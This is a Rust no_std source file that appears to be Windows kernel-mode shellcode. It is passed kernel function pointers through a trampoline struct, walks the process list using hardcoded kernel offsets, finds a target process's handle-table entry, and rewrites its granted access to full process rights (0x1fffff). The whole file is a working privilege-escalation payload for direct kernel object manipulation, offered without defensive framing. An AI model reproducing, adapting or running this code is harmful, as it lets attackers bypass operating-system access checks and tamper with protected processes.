#![no_std]
#![no_main]
extern crate panic_halt;

use core::ffi::c_char;
use core::ffi::c_void;

const PS_GET_NEXT_PROCESS_OFFSET: u64 = 0x062bfa0;
const PS_GET_NEXT_PROCESS_OFFSET_REAL: u64 = 0x05f73c0;
const EX_LOOKUP_HANDLE_TABLE_ENTRY_OFFSET: u64 = 0x063e910;
const EX_LOOKUP_HANDLE_TABLE_ENTRY_OFFSET_REAL: u64 = 0x0645680;
//const PsGetNextProcessOffset_real = 0x05f73c0;
const TOKEN_OFFSET: u64 = 0x4B8;
const OBJECT_TABLE_OFFSET: u64 = 0x570;
const UNIQUE_PROCESS_ID_OFFSET: u64 = 0x440;

#[allow(non_snake_case)]
pub type DbgPrintEx =
    unsafe extern "system" fn(ComponentId: u32, Level: u32, Format: *const c_char, ...) -> u32;

pub type PsGetNextProcessFn = unsafe extern "system" fn(proc: *const c_void) -> u64;
pub type ExEnumHandleTable = unsafe extern "system" fn(object_table: *const c_void) -> u64;
pub type ExLokkupHandleTableEntry =
    unsafe extern "system" fn(object_table: *const c_void, handle: u64) -> u64;

#[repr(C)]
pub struct TrampData {
    ex_allocate_pool_with_tag: u64,
    memcpy: u64,
    iof_complete_request: u64,
    mm_get_system_routine_address: u64,
    kernel_base: u64,
    dbg_print_ex: DbgPrintEx,
    target_procss: u64,
    target_handle: u64,
}

#[unsafe(no_mangle)]
#[inline(never)]
pub extern "C" fn _start(tramp_data: *mut TrampData) -> u32 {
    unsafe {
        //asm!("int3");
        let ps_get_next_process_address = (*tramp_data)
            .kernel_base
            .overflowing_add(PS_GET_NEXT_PROCESS_OFFSET_REAL)
            .0;
        let ps_get_next_process: PsGetNextProcessFn =
            core::mem::transmute(ps_get_next_process_address);

        let ex_lookup_handle_table_entry_address = (*tramp_data)
            .kernel_base
            .overflowing_add(EX_LOOKUP_HANDLE_TABLE_ENTRY_OFFSET_REAL)
            .0;
        let ex_lookup_handle_table_entry: ExLokkupHandleTableEntry =
            core::mem::transmute(ex_lookup_handle_table_entry_address);

        let mut p = ps_get_next_process(core::ptr::null());
        while p != 0 {
            let image_file_name: *const c_char = p.overflowing_add(0x5A8).0 as *const c_char;
            let object_table: *const c_void =
                *(p.overflowing_add(OBJECT_TABLE_OFFSET).0 as *const u64) as *const c_void;
            let pid: u64 = *(p.overflowing_add(UNIQUE_PROCESS_ID_OFFSET).0 as *const u64);

            if pid == (*tramp_data).target_procss {
                let handle =
                    ex_lookup_handle_table_entry(object_table, (*tramp_data).target_handle);
                if handle != 0 {
                    core::ptr::write_volatile((handle + 0x8) as *mut u32, 0x1fffff);
                }
            }

            p = ps_get_next_process(p as *const c_void);
        }
        0
    }
}
